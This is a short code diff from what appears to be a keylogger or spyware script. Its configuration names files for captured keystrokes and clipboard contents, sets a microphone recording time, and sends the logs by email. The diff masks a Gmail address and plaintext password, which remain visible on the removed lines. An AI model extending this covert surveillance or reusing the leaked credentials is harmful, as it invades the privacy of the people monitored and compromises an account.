@@ -35,8 +35,8 @@ file_merge = file_pth + extend
 clipboard_info = "clipboard.txt"
 keys_information = "log.txt"
 
-email_address = "junkgitemail@gmail.com"
-password = "junkgitemail1234!"
+email_address = "***********"
+password = "**************"
 toaddr = email_address
 
 microphone_time = 10  # this is in seconds
